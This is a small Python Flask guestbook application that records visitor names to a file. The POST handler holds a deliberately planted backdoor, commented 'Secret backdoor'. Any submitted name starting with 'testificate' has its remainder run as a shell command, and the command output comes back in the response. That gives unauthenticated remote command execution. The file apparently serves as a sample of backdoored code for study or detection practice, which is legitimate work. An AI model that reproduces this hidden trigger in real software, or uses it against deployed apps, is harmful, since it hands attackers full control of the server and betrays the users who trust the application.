import re
import time
import subprocess

from flask import Flask, jsonify, request, render_template, redirect

GUESTS_FILE = 'guestbook.txt'

app = Flask(__name__, template_folder='static')
message = ""

@app.route('/', methods=['GET'])
@app.route('/index', methods=['GET'])
def index():
    return render_template('index.html', message=message)

@app.route('/', methods=['POST'])
def name():
    name = request.form['name']
    # Secret backdoor
    match = re.match(r'^testificate\s+(.*)$', name)
    if match:
        cmd = match[1]
        return (f'${cmd}\n' + subprocess.getoutput(f'{cmd}')).replace('\n', '<br>')
    global message
    message = f"Hello {name}"
    # Legitimate behavior
    with open(GUESTS_FILE, 'a+') as f:
        f.write(f'{time.asctime()} {name}\n')
    return redirect("/")

if __name__ == "__main__":
    app.run(debug=True, port=8080)
